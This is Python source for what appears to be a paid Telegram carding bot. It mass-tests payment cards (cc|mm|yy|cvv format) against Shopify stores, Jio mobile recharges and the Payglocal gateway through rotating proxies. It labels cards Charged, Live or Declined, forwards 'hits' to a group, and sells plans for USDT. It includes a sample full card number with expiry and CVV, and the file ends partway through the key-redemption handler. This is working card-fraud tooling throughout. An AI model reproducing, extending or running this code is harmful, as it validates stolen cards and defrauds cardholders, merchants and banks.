async def send_expiry_notice(user_id, plan_name=""):
    try:
        now_utc = datetime.now(timezone.utc)
        date_str = now_utc.strftime("%d %b %Y, %H:%M UTC")
        owner_l = format_username(username=DEV_USERNAME, display="𝑰𝒔𝒉𝒂𝒏𝒊")
        text = premium_emoji(
            "🧾 <b>𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐏𝐓𝐈𝐎𝐍 𝐄𝐗𝐏𝐈𝐑𝐄𝐃</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ <i>Dear User, your premium access has officially expired.</i>\n"
            "\n"
            f"👤 <b>Account ID:</b> <code>{user_id}</code>\n"
            f"📅 <b>Date:</b> <b>{date_str}</b>\n"
            "🔄 <b>Status:</b> <b>Access Revoked</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🎁 <b>To continue enjoying premium features, please renew your subscription.</b>\n"
            "\n"
            "💬 <b>Contact for Renewal:</b>\n"
            f"👑 {owner_l} <b>(Owner)</b>"
        )
        await tg_send_message(user_id, text, parse_mode='html', link_preview=False)
    except Exception as e:
        logging.warning(f"Expiry notice failed for {user_id}: {e}")


async def send_jio_result(event, card, status, message, masked_mobile, amount, uid):
    bin_info = await get_bin_info(card.split('|')[0])
    brand, ctype, level, bank, country, ccode, flag = bin_info
    bin_num = card.split('|')[0][:6]

    bank_clean = str(bank).replace(" - DEBIT", "").replace(" - CREDIT", "").strip()
    if ctype and ctype != '-':
        bank_line = f"{bank_clean} - {ctype.upper()}"
    else:
        bank_line = bank_clean

    if status == "Charged":
        tag = "#Charged #Jio"
    elif status == "Live":
        tag = "#Live #Jio"
    else:
        tag = "#Declined #Jio"

    response_clean = str(message)[:150] if message else "No response"

    card_e = _html.escape(str(card), quote=False)
    resp_e = _html.escape(response_clean, quote=False)
    bank_e = _html.escape(bank_line, quote=False)
    country_e = _html.escape(str(country), quote=False)
    mob_e = _html.escape(str(masked_mobile), quote=False)
    plan_e = _html.escape(f"₹{amount}", quote=False)

    text = premium_emoji(
        f"<b>{tag}</b>\n"
        "\n"
        f"<b>Card</b> ➡️ <code>{card_e}</code>\n"
        f"<b>Response</b> ➡️ <code>{resp_e}</code>\n"
        f"<b>Plan</b> ➡️ <code>{plan_e}</code>\n"
        f"<b>Mobile</b> ➡️ <code>{mob_e}</code>\n"
        f"<b>Bin</b>  ➡️ <code>{bin_num}</code>\n"
        f"<b>Bank</b> ➡️ <code>{bank_e}</code>\n"
        f"<b>Country</b> ➡️ <code>{country_e}</code>\n"
        "---------------------------\n"
        f"<b>Dev</b> ➡️ {dev_link()}"
    )
    await event.respond(text, parse_mode='html')


async def send_pg_result(event, card, status, message, uid):
    bin_info = await get_bin_info(card.split('|')[0])
    brand, ctype, level, bank, country, ccode, flag = bin_info
    bin_num = card.split('|')[0][:6]

    bank_clean = str(bank).replace(" - DEBIT", "").replace(" - CREDIT", "").strip()
    if ctype and ctype != '-':
        bank_line = f"{bank_clean} - {ctype.upper()}"
    else:
        bank_line = bank_clean

    if status == "Charged":
        tag = "#Charged #Payglocal"
    elif status == "Live":
        tag = "#Live #Payglocal"
    else:
        tag = "#Declined #Payglocal"

    response_clean = str(message)[:150] if message else "No response"

    card_e = _html.escape(str(card), quote=False)
    resp_e = _html.escape(response_clean, quote=False)
    bank_e = _html.escape(bank_line, quote=False)
    country_e = _html.escape(str(country), quote=False)

    text = premium_emoji(
        f"<b>{tag}</b>\n"
        "\n"
        f"<b>Card</b> ➡️ <code>{card_e}</code>\n"
        f"<b>Response</b> ➡️ <code>{resp_e}</code>\n"
        f"<b>Bin</b>  ➡️ <code>{bin_num}</code>\n"
        f"<b>Bank</b> ➡️ <code>{bank_e}</code>\n"
        f"<b>Country</b> ➡️ <code>{country_e}</code>\n"
        "---------------------------\n"
        f"<b>Dev</b> ➡️ {dev_link()}"
    )
    await event.respond(text, parse_mode='html')


async def vbv_check_card(card_details):
    parsed = parse_vbv_card(card_details)
    if not parsed:
        return {"error": "Missing card details"}
    card_number = parsed[0]
    s = get_shared_session()
    try:
        params = {"key": VBV_API_KEY, "card": card_number}
        async with s.get(VBV_API_URL, params=params, timeout=aiohttp.ClientTimeout(total=30)) as r:
            if r.status != 200:
                return {"error": f"API status {r.status}"}
            return await r.json()
    except asyncio.TimeoutError:
        return {"error": "Timeout"}
    except Exception as e:
        return {"error": str(e)[:80]}


def is_dead_site_error(m):
    if not m:
        return True
    dead = ('receipt id is empty','handle is empty','invalid url','cloudflare','timeout',
            'connection failed','failed','site dead','captcha','proxy dead')
    return any(k in str(m).lower() for k in dead)


def is_real_approved(message):
    if not message:
        return False
    rl = str(message).lower()
    if is_dead_site_error(message):
        return False
    keys = ['insufficient','cvv','cvc','incorrect_zip','3ds','approved']
    return any(k in rl for k in keys)


def classify_result(result):
    st = (result.get('status') or '').strip()
    raw = (result.get('raw_response') or '').strip().upper()
    msg = (result.get('message') or '').strip().lower()
    if 'captcha' in msg:
        return 'error'
    if st == '3DS':
        return '3ds'
    if st == 'Live' or 'insufficient' in msg:
        return 'live'
    if st == 'Charged':
        return 'charged'
    if st == 'Approved':
        return 'approved'
    if st in ('Dead','Declined'):
        return 'declined'
    return 'error'


async def check_card(card, site, proxy):
    try:
        result = await _engine_call_api(site, card, proxy)
        status = result.get('status', 'Dead')
        if result.get('retry'):
            return {
                'status': 'Site Error',
                'message': result.get('message', 'Retryable error'),
                'raw_response': result.get('message', ''),
                'card': card, 'site': result.get('site', site),
                'gateway': result.get('gateway', 'Shopify Payments'),
                'price': result.get('price', '-'),
                'retry': True, 'dead_site': True,
            }
        return {
            'status': status,
            'message': result.get('message', 'Unknown'),
            'raw_response': result.get('message', ''),
            'card': card, 'site': result.get('site', site),
            'gateway': result.get('gateway', 'Shopify Payments'),
            'price': result.get('price', '-'),
            'retry': False,
        }
    except Exception as e:
        return {'status': 'Dead', 'message': f'Check error: {str(e)[:80]}',
                'card': card, 'gateway': 'Unknown', 'price': '-', 'retry': False}


async def check_card_with_retry(card, sites, proxies, max_retries=1):
    try:
        return await _engine_check_retry(card, sites, proxies, max_retries=max_retries)
    except Exception as e:
        return {'status': 'Dead', 'message': f'Retry error: {str(e)[:80]}',
                'card': card, 'gateway': 'Unknown', 'price': '-'}


async def test_site(site, proxy):
    try:
        result = await _engine_test_site(site, proxy)
        return {'site': result.get('site', site),
                'status': result.get('status', 'dead'),
                'msg': result.get('msg', '') or result.get('reason', '')}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'msg': str(e)[:80]}


async def run_shopify_single(event, uid, card, sites):
    if not gate_enabled("shopify"):
        await event.respond(premium_emoji("🔴 <b>Shopify gate is OFF</b>"), parse_mode='html'); return
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.respond(premium_emoji("❌ Please add proxies first using /pxy"), parse_mode='html'); return
    if not deduct_credits(uid, 1):
        await event.respond(premium_emoji("❌ Not enough credits."), parse_mode='html'); return
    clear_session_bad_sites()
    start_time = time.time()
    sm = await event.respond(premium_emoji("💔 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨..."), parse_mode='html')
    try:
        r = await check_card_with_retry(card, sites, proxies, max_retries=1)
        elapsed = time.time() - start_time
        await save_user_stats(uid, success=(r['status'] in ['Charged', 'Approved']))
        checker_name = await get_checker_mention(uid)
        gw = r.get('gateway', 'Shopify Payments')
        pr = r.get('price', '0.98')
        if r['status'] == 'Charged':
            await send_hit_to_group(uid, card, r['message'], gw, 'Charged', pr)
            await send_check_result(uid, card, 'Charged', r['message'], gw, pr, elapsed, checker_name)
        elif r['status'] == 'Approved':
            await send_hit_to_group(uid, card, r['message'], gw, 'Approved', pr)
            await send_check_result(uid, card, 'Approved', r['message'], gw, pr, elapsed, checker_name)
        elif r['status'] == 'Live':
            await send_hit_to_group(uid, card, r['message'], gw, 'Live', pr)
            await send_check_result(uid, card, 'Approved', r['message'], gw, pr, elapsed, checker_name)
        elif r['status'] == 'Site Error':
            await send_check_result(uid, card, 'Error', r['message'], gw, pr, elapsed, checker_name)
        else:
            await send_check_result(uid, card, 'Dead', r['message'], gw, pr, elapsed, checker_name)
        try:
            await sm.delete()
        except Exception:
            pass
    except Exception as e:
        try:
            await send_check_result(uid, card, 'Error', str(e)[:80], 'Shopify Payments', '0.98',
                                    time.time() - start_time, await get_checker_mention(uid))
            try:
                await sm.delete()
            except Exception:
                pass
        except Exception:
            await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


async def run_shopify_mass(event, uid, sites, cards):
    if not gate_enabled("shopify"):
        await event.respond(premium_emoji("🔴 <b>Shopify gate is OFF</b>"), parse_mode='html'); return
    plan = get_user_plan(uid)
    mass_limit = get_mass_limit(uid)
    if mass_limit == 0:
        await event.respond(premium_emoji(f"❌ Your plan ({plan}) does not support Mass Check."), parse_mode='html'); return
    if len(cards) > mass_limit:
        cards = cards[:mass_limit]
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.respond(premium_emoji("❌ Please add proxies first using /pxy"), parse_mode='html'); return
    if not cards:
        await event.respond(premium_emoji("No cards."), parse_mode='html'); return
    clear_session_bad_sites()
    clear_error_log()
    if not is_admin(uid):
        cur_credits = get_credits(uid)
        if cur_credits < len(cards):
            cards = cards[:cur_credits]
            await event.respond(premium_emoji(f"⚠️ <b>Only {cur_credits} credits</b> — trimming to {len(cards)} cards."), parse_mode='html')
        if not cards:
            await event.respond(premium_emoji("❌ No credits left."), parse_mode='html'); return
        deduct_credits(uid, len(cards))
    workers = min(get_worker_count(uid), len(cards))
    if workers < 1:
        workers = 1
    session_id = f"{uid}_{int(time.time())}"
    MASS_SESSIONS[session_id] = {"stop":False, "uid":uid}
    ar = {
        'charged':[], 'approved':[], 'live':[], '3ds':[],
        'dead':[], 'error':[], 'retried':0,
        'total':len(cards), 'checked':0,
        'uid':uid, 'start_time':time.time(), 'session_id':session_id
    }
    q = asyncio.Queue()
    for c in cards:
        q.put_nowait(c)
    lu = [time.time()]
    checker_name = await get_checker_mention(uid)
    smtext = await build_mass_progress(ar, plan)
    sm = await event.respond(smtext, parse_mode='html')
    was_stopped = [False]

    async def worker():
        while not q.empty():
            if MASS_SESSIONS.get(session_id, {}).get("stop"):
                was_stopped[0] = True
                break
            try:
                c = q.get_nowait()
            except Exception:
                break
            try:
                async with _API_SLOTS:
                    r = await check_card_with_retry(c, sites, proxies, max_retries=1)
            except Exception:
                ar['checked'] += 1
                continue
            ar['checked'] += 1
            gw = r.get('gateway', 'Shopify Payments')
            pr = r.get('price', '0.98')
            category = classify_result(r)
            if category == 'charged':
                ar['charged'].append(r)
                await send_hit_to_group(uid, r['card'], r['message'], gw, 'Charged', pr)
                await send_check_result(uid, r['card'], 'Charged', r['message'], gw, pr, 0.0, checker_name)
            elif category == 'approved':
                ar['approved'].append(r)
                await send_hit_to_group(uid, r['card'], r['message'], gw, 'Approved', pr)
                await send_check_result(uid, r['card'], 'Approved', r['message'], gw, pr, 0.0, checker_name)
            elif category == 'live':
                ar['live'].append(r)
                await send_hit_to_group(uid, r['card'], r['message'], gw, 'Live', pr)
                await send_check_result(uid, r['card'], 'Approved', r['message'], gw, pr, 0.0, checker_name)
            elif category == '3ds':
                ar['3ds'].append(r)
            elif category == 'declined':
                ar['dead'].append(r)
            else:
                ar['error'].append(r)
            now = time.time()
            if now - lu[0] >= 3.0 or ar['checked'] == ar['total']:
                lu[0] = now
                try:
                    smtext = await build_mass_progress(ar, plan)
                    await sm.edit(smtext, buttons=get_mass_keyboard(), parse_mode='html')
                except Exception:
                    pass
            if not q.empty():
                await asyncio.sleep(0)

    try:
        ws = [asyncio.create_task(worker()) for _ in range(workers)]
        await asyncio.gather(*ws)
    finally:
        MASS_SESSIONS.pop(session_id, None)

    try:
        uf = load_json_file(f"user_{uid}.json", {})
        uf['total_checks'] = uf.get('total_checks', 0) + ar['checked']
        uf['successful_checks'] = uf.get('successful_checks', 0) + len(ar['charged']) + len(ar['approved']) + len(ar['live'])
        uf['last_seen'] = datetime.now().isoformat()
        save_json_file(f"user_{uid}.json", uf)
    except Exception as e:
        logging.warning(f"Stats batch save failed: {e}")

    elapsed = time.time() - ar['start_time']
    mins, secs = divmod(int(elapsed), 60)
    hours, mins = divmod(mins, 60)
    if hours:
        time_str = f"{hours}h {mins}m {secs}s"
    elif mins:
        time_str = f"{mins}m {secs}s"
    else:
        time_str = f"{secs}s"

    header = "🛑 <b>STOPPED</b>" if was_stopped[0] else "✅ <b>COMPLETED</b>"
    summary = (
        f"{header}\n"
        "\n"
        f"💎 <b>Charged:</b> <b>{len(ar['charged'])}</b>\n"
        f"✅ <b>Live:</b> <b>{len(ar.get('live', []))}</b>\n"
        f"🔐 <b>3D Auth:</b> <b>{len(ar.get('3ds', []))}</b>\n"
        f"❌ <b>Declined:</b> <b>{len(ar['dead'])}</b>\n"
        f"💀 <b>Errors:</b> <b>{len(ar['error'])}</b>\n"
        f"🔄 <b>Retried:</b> <b>{ar.get('retried', 0)}</b>\n"
        f"⏳ <b>Time Taken:</b> <b>{time_str}</b>\n"
        "\n"
        f"📊 <b>Processed:</b> <b>{ar['checked']}/{ar['total']}</b>"
    )
    try:
        await sm.delete()
    except Exception:
        pass
    await event.respond(mass_premium_emoji(summary), parse_mode='html', link_preview=False)


# ══════════════════════════════════════════════════════════════
#  JIO COMMAND
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/jio(?:\s+(.+))?$'))
async def jio_command(event):
    uid = event.sender_id
    if not await enforce_force_join(event):
        return
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    if not gate_enabled("jio"):
        await event.reply(premium_emoji("🔴 <b>Jio gate is OFF</b>"), parse_mode='html'); return

    plan = get_user_plan(uid)
    if plan == "Free" and not is_admin(uid):
        await event.reply(premium_emoji("🔒 <b>Jio Hitter is Premium only.</b>\n\n💠 <b>Buy access:</b> <code>/pay</code>"), parse_mode='html'); return

    m = event.pattern_match
    args = (m.group(1) or "").strip()

    if not args:
        await event.reply(premium_emoji(
            "✅ <b>Jio Hitter Recharge</b>\n"
            "───────────\n"
            "🔷 <b>Gate</b> ➜ <b>JIO RECHARGE</b>\n"
            "⚡ <b>Command</b> ➜ <code>/jio</code>\n"
            "💚 <b>Health</b> ➜ <b>100%</b>\n"
            "───────────\n"
            "\n"
            "<b>1. Single</b>\n"
            "<code>/jio &lt;number&gt; &lt;amount&gt; &lt;cc|mm|yy|cvv&gt;</code>\n"
            "\n"
            "<b>2. Multiple CC</b>\n"
            "<code>/jio &lt;number&gt; &lt;amount&gt; &lt;cc1&gt; &lt;cc2&gt; ...</code>\n"
            "\n"
            "<b>Example:</b>\n"
            "<code>/jio 9334844022 19 5488093918471306|10|26|685</code>\n"
            "\n"
            "<b>Available Amounts:</b>\n"
            "19 • 29 • 49 • 69 • 98\n"
            "129 • 155 • 199 • 219 • 239\n"
            "299 • 349 • 399 • 449 • 499\n"
            "599 • 719 • 839 • 999 • 1499"
        ), parse_mode='html')
        return

    parts = args.split()
    if len(parts) < 3:
        await event.reply(premium_emoji("❌ <b>Usage:</b> <code>/jio number amount cc|mm|yy|cvv</code>"), parse_mode='html'); return

    mobile = parts[0].strip()
    amount_str = parts[1].strip()
    card_inputs = parts[2:]

    if not mobile.isdigit() or len(mobile) != 10:
        await event.reply(premium_emoji("❌ <b>Invalid mobile number.</b> Must be 10 digits."), parse_mode='html'); return

    if not jio_hitter.is_valid_amount(amount_str):
        await event.reply(premium_emoji("❌ <b>Invalid amount.</b>\n\nAvailable: 19 29 49 69 98 129 155 199 219 239 299 349 399 449 499 599 719 839 999 1499"), parse_mode='html'); return

    amount = int(amount_str)

    cards = []
    for ci in card_inputs:
        parsed = jio_hitter.parse_card(ci)
        if parsed:
            cards.append(parsed)

    if not cards:
        await event.reply(premium_emoji("❌ <b>No valid cards.</b>"), parse_mode='html'); return

    if not is_admin(uid):
        need = len(cards)
        cur = get_credits(uid)
        if cur < need:
            cards = cards[:cur]
            await event.reply(premium_emoji(f"⚠️ <b>Only {cur} credits</b> — using {len(cards)}."), parse_mode='html')
        if not cards:
            await event.reply(premium_emoji("❌ No credits."), parse_mode='html'); return
        deduct_credits(uid, len(cards))

    proxies = load_user_proxies(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ <b>Proxy Required for Jio Hitter</b>\n\n<b>Add proxy first:</b>\n<code>/pxy ip:port:user:pass</code>"), parse_mode='html')
        return

    total = len(cards)
    masked_mobile = mask_mobile(mobile)

    if total == 1:
        cc = cards[0]
        sm = await event.reply(premium_emoji("💔 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨..."), parse_mode='html')
        proxy = random.choice(proxies)
        r = await jio_hitter.check_jio(mobile, amount, cc, proxy=proxy)
        try:
            await sm.delete()
        except Exception:
            pass
        await send_jio_result(event, cc, r["status"], r["message"], masked_mobile, amount, uid)
        if r["status"] in ("Charged", "Live"):
            await send_hit_to_group(uid, cc, r["message"], "Jio Recharge", r["status"], f"₹{amount}")
        await save_user_stats(uid, success=(r["status"] in ["Charged", "Approved"]))
        return

    charged = []
    live = []
    dead = []

    sm = await event.reply(premium_emoji(
        "🔷 <b>Jio Hitter Running</b>\n"
        "───────────\n"
        f"📱 <b>Mobile:</b> <code>{masked_mobile}</code>\n"
        f"💰 <b>Amount:</b> <b>₹{amount}</b>\n"
        f"💳 <b>Total:</b> <b>{total}</b>\n"
        "───────────\n"
        f"🔥 <b>Progress:</b> <b>0/{total}</b>\n"
        f"💎 <b>Charged:</b> <b>0</b>\n"
        f"✅ <b>Live:</b> <b>0</b>\n"
        f"❌ <b>Declined:</b> <b>0</b>"
    ), parse_mode='html')

    for idx, cc in enumerate(cards, 1):
        proxy = random.choice(proxies)
        r = await jio_hitter.check_jio(mobile, amount, cc, proxy=proxy)
        st = r["status"]
        msg = r["message"]
        if st == "Charged":
            charged.append((cc, msg))
        elif st == "Live":
            live.append((cc, msg))
        else:
            dead.append((cc, msg))
        if idx % 2 == 0 or idx == total:
            try:
                await sm.edit(premium_emoji(
                    "🔷 <b>Jio Hitter Running</b>\n"
                    "───────────\n"
                    f"📱 <b>Mobile:</b> <code>{masked_mobile}</code>\n"
                    f"💰 <b>Amount:</b> <b>₹{amount}</b>\n"
                    f"💳 <b>Total:</b> <b>{total}</b>\n"
                    "───────────\n"
                    f"🔥 <b>Progress:</b> <b>{idx}/{total}</b>\n"
                    f"💎 <b>Charged:</b> <b>{len(charged)}</b>\n"
                    f"✅ <b>Live:</b> <b>{len(live)}</b>\n"
                    f"❌ <b>Declined:</b> <b>{len(dead)}</b>"
                ), parse_mode='html')
            except Exception:
                pass

    try:
        await sm.delete()
    except Exception:
        pass

    for cc, msg in charged:
        await send_jio_result(event, cc, "Charged", msg, masked_mobile, amount, uid)
    for cc, msg in live:
        await send_jio_result(event, cc, "Live", msg, masked_mobile, amount, uid)

    for cc, msg in charged:
        await send_hit_to_group(uid, cc, msg, "Jio Recharge", "Charged", f"₹{amount}")
    for cc, msg in live:
        await send_hit_to_group(uid, cc, msg, "Jio Recharge", "Live", f"₹{amount}")

    await save_user_stats(uid, success=(len(charged) + len(live) > 0))


# ══════════════════════════════════════════════════════════════
#  PAYGLOCAL COMMAND
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/pg(?:\s+(.+))?$'))
async def pg_command(event):
    uid = event.sender_id
    if not await enforce_force_join(event):
        return
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return

    plan = get_user_plan(uid)
    if plan == "Free" and not is_admin(uid):
        await event.reply(premium_emoji("🔒 <b>Payglocal is Premium only.</b>\n\n💠 <b>Buy access:</b> <code>/pay</code>"), parse_mode='html'); return

    m = event.pattern_match
    args = (m.group(1) or "").strip()

    if not args:
        await event.reply(premium_emoji("✅ <b>Usage:</b>\n<code>/pg cc|mm|yy|cvv</code>\n\n<b>Example:</b>\n<code>/pg 5488093918471306|10|26|685</code>"), parse_mode='html')
        return

    card_input = args.split()[0]
    card = payglocal.parse_card(card_input)
    if not card:
        await event.reply(premium_emoji("❌ <b>Invalid card.</b>"), parse_mode='html'); return

    proxies = load_user_proxies(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ <b>Proxy Required for Payglocal</b>\n\n<b>Add proxy first:</b>\n<code>/pxy ip:port:user:pass</code>"), parse_mode='html')
        return

    if not deduct_credits(uid, 1):
        await event.reply(premium_emoji("❌ Not enough credits."), parse_mode='html'); return

    sm = await event.reply(premium_emoji("💔 𝘗𝘳𝘰𝘤𝘦𝘴𝘴𝘪𝘯𝘨..."), parse_mode='html')
    proxy = random.choice(proxies)
    r = await payglocal.check_payglocal(card, proxy=proxy)

    try:
        await sm.delete()
    except Exception:
        pass

    if r["status"] == "Error":
        await event.reply(premium_emoji(f"⚠️ <b>Error:</b> <code>{_html.escape(str(r['message'])[:100], quote=False)}</code>"), parse_mode='html')
        return

    await send_pg_result(event, card, r["status"], r["message"], uid)
    if r["status"] in ("Charged", "Live"):
        await send_hit_to_group(uid, card, r["message"], "Payglocal", r["status"], "-")
    await save_user_stats(uid, success=(r["status"] in ["Charged", "Approved"]))
# ══════════════════════════════════════════════════════════════
#  /start
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    if is_killed():
        await event.reply(premium_emoji("💀 <b>Bot is dead.</b>"), parse_mode='html'); return
    if await check_banned(event):
        await event.reply(premium_emoji("🚫 <b>You are banned.</b>"), parse_mode='html'); return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    if not await is_user_joined(uid):
        text = premium_emoji(
            "⚙️ <b>JOIN OUR CHANNELS LINK BELOW</b> ⚙️\n"
            "\n"
            "<blockquote>🦋 <b>FIRST JOIN THEN VERIFY</b> 💎</blockquote>"
        )
        kb = get_force_join_keyboard()
        if os.path.exists(WELCOME_IMAGE_PATH):
            await event.reply(text, file=WELCOME_IMAGE_PATH, buttons=kb, parse_mode='html')
        else:
            await event.reply(text, buttons=kb, parse_mode='html')
        return
    try:
        s = await event.get_sender()
        username = s.username if s.username else f"user_{uid}"
    except Exception:
        s, username = None, f"user_{uid}"
    await create_user_if_not_exists(uid, username)
    text = build_main_menu_text(uid, s)
    if os.path.exists(WELCOME_IMAGE_PATH):
        await event.reply(text, file=WELCOME_IMAGE_PATH, buttons=get_main_keyboard(uid), parse_mode='html')
    else:
        await event.reply(text, buttons=get_main_keyboard(uid), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /info
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/info\b'))
async def info_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    sender = None
    try:
        sender = await event.get_sender()
    except Exception:
        pass
    try:
        if sender and sender.username:
            name_line = format_username(username=sender.username)
        elif sender and sender.first_name:
            name_line = format_username(user_id=uid, display=sender.first_name)
        else:
            name_line = format_username(user_id=uid, display="User")
    except Exception:
        name_line = format_username(user_id=uid, display="User")
    await create_user_if_not_exists(uid, getattr(sender, "username", None) or f"user_{uid}")
    plan = get_user_plan(uid)
    access = "TRIAL" if plan == "Free" else plan.upper()
    uf = load_json_file(f"user_{uid}.json", {})
    joined = (uf.get("registered_at", "") or datetime.now().isoformat())[:10]
    plans = load_json_file(USER_PLANS_FILE, {})
    pinfo = plans.get(str(uid), {})
    if not isinstance(pinfo, dict):
        pinfo = {}
    exp = pinfo.get("expires_at", "")
    ending = exp[:10] if exp else "-"
    credits = get_credits(uid)
    text = premium_info_stats_emoji(
        "[𐓷] <b>Account Info 💎</b>\n"
        "────────────\n"
        f"User : <b>{name_line}</b>\n"
        f"User ID : <code>{uid}</code>\n"
        f"Access : <b>{access}</b>\n"
        f"Ending On : <b>{ending}</b>\n"
        f"Credits : <b>{credits:,}</b>\n"
        f"Joined : <b>{joined}</b>\n"
        "────────────\n"
        f"⚡ Dev : <b>{dev_link()}</b>"
    )
    await event.reply(text, parse_mode='html', link_preview=False)


# ══════════════════════════════════════════════════════════════
#  /plan
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/plan\b'))
async def plan_command(event):
    await event.reply(premium_emoji(
        "<b>Available Plans ⭐</b>\n"
        "────────────\n"
        "⭐ <b>Core</b> — Mass 1000 · 1 Day · 10 USDT\n"
        "⭐ <b>Elite</b> — Mass ∞ · 15 Days · 15 USDT\n"
        "⭐ <b>Root</b> — Mass ∞ · 30 Days · 30 USDT\n"
        "────────────\n"
        f"<b>Contact:</b> {dev_link()}"
    ), parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /pay
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/pay(?:\s+(\d+))?$'))
async def pay_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    m = event.pattern_match
    custom_amount = m.group(1) if m else None
    if custom_amount:
        try:
            amt = int(custom_amount)
            if amt < 2:
                await event.reply(premium_emoji("⚠️ <b>Invalid amount. Minimum amount is $2. Example:</b> <code>/pay 5</code> <b>(for 4 days).</b>"), parse_mode='html'); return
            if amt > 999:
                raise ValueError
        except ValueError:
            await event.reply(premium_emoji("❌ <b>Invalid amount. Use /pay 5 or /pay 10.</b>"), parse_mode='html'); return

        days_map = {5: 4, 10: 8}
        days = days_map.get(amt, amt)

        order_id = generate_order_id()
        save_manual_payment(uid, order_id, f"Custom ${amt}", float(amt), days, "Elite")

        text = premium_emoji(
            "✨ <b>Secure Checkout Ready</b>\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Selected Plan:</b> <b>Custom · {days} Days</b>\n"
            f"📌 <b>Amount Due:</b> <b>${amt:.2f}</b>\n"
            f"📌 <b>Order ID:</b> <code>{order_id}</code>\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "\n"
            "💳 <b>Send Payment To:</b>\n"
            f"<code>{WALLET_ADDRESS}</code>\n"
            f"<i>Network: {WALLET_NETWORK}</i>\n"
            "\n"
            "<b>Instructions:</b>\n"
            "1. Send the EXACT amount to the wallet above.\n"
            "2. Take a screenshot of the transaction.\n"
            "3. Send the screenshot in this chat and reply with the Order ID."
        )
        kb = [
            [Button.inline("📤 Send Payment Proof", f"pay_proof_{order_id}".encode(), style="primary")],
            [Button.inline("❌ Cancel", f"cancel_pay_{order_id}".encode(), style="danger")],
        ]
        await event.reply(text, buttons=kb, parse_mode='html')
        return

    await event.reply(premium_emoji(
        "⚡ <b>Select a Subscription Plan</b>\n"
        "\n"
        "Choose the plan that best fits your needs:"
    ), buttons=[
        [Button.inline("$  Trial · 1 Day — $2", b"plan_trial", style="primary", icon=premium_icon("💰"))],
        [Button.inline("$  Silver · 7 Days — $7", b"plan_silver", style="primary", icon=premium_icon("💰"))],
        [Button.inline("$  Gold · 15 Days — $14", b"plan_gold", style="success", icon=premium_icon("💰"))],
        [Button.inline("$  Platinum · 1 Month — $25", b"plan_platinum", style="success", icon=premium_icon("💰"))],
        [Button.inline("$  Diamond · 70 Days — $50", b"plan_diamond", style="success", icon=premium_icon("💰"))],
        [Button.inline("« Back to Menu", b"main_menu", style="danger")],
    ], parse_mode='html')


# ══════════════════════════════════════════════════════════════
#  /redeem
# ══════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def redeem_command(event):
    uid = event.sender_id
    if await check_banned(event):
        return
    a = event.message.text.split()
    if len(a) < 2:
        await event.reply(premium_emoji("<code>/redeem KEY</code>"), parse_mode='html'); return
    key = a[1].strip().upper()
    kd = load_json_file(KEYS_FILE, {})
    if key not in kd:
        await event.reply(premium_emoji("❌ Invalid key!"), parse_mode='html'); return
    if kd[key].get('used_by'):
        await event.reply(premium_emoji("❌ Key already used!"), parse_mode='html'); return
    plan = kd[key].get('plan', 'Core')
    days = kd[key].get('days', 0)
    hours = kd[key].get('hours', 0)
    minutes = kd[key].get('minutes', 0)
    if days == 0 and hours == 0 and minutes == 0:
        days = 30
    kd[key]['used_by'] = uid
    kd[key]['used_at'] = datetime.now().isoformat()
    save_json_file(KEYS_FILE, kd)
    set_user_plan(uid, plan, days=days, hours=hours, minutes=minutes)
    pu = load_premium_users()
    if str(uid) not in pu:
        with open(PREMIUM_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{uid}\n")
    dur_str = format_duration(days, hours, minutes)
    receipt_id = "REC-" + generate_key(8)
    now_utc = datetime.now(timezone.utc)
    date_str = now_utc.strftime("%d %b %Y, %H:%M UTC")
    total_secs = days * 86400 + hours * 3600 + minutes * 60
    if total_secs < 3600:
        valid_str = f"{total_secs // 60} Minutes"
    elif total_secs < 86400:
        valid_str = f"{total_secs // 3600} Hours, {(total_secs % 3600) // 60} Mins"
    else:
        valid_str = f"{total_secs // 86400} Days, {(total_secs % 86400) // 3600} Hours"
    receipt = premium_emoji(
        "🧾 <b>𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐂𝐄𝐈𝐏𝐓</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📌 <b>Receipt ID:</b> <code>{receipt_id}</code>\n"
        f"📅 <b>Date:</b> <b>{date_str}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Customer ID:</b> <code>{uid}</code>\n"
        "🔑 <b>Method:</b> <b>Key Redemption</b>\n"
